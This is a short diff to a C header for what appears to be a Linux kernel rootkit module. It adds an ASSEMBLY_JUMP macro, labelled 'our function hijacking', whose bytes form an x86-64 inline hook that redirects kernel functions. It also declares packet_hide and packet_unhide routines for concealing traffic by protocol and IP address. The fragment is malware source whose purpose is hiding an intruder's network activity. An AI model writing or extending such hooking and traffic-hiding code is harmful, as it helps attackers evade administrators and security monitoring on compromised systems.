@@ -1,5 +1,5 @@
-#ifndef PACKET_HIDING
-#define PACKET_HIDING
+#ifndef PACKET_H
+#define PACKET_H
 
 #include <linux/inet.h>
 #include <linux/ip.h>
@@ -9,6 +9,13 @@
 
 /* length of assembly to override */
 #define ASSEMBLY_LENGTH 12
+
+/* our function hijacking */
+#define ASSEMBLY_JUMP 					\
+({	 0x48, 0xb8, 0x00, 0x00, 			\
+	 0x00, 0x00, 0x00, 0x00, 			\
+	 0x00, 0x00, 0x50, 0xc3				\
+})
 
 void packet_hide(char *protocol, char *ip);
 void packet_unhide(char *protocol, char *ip);
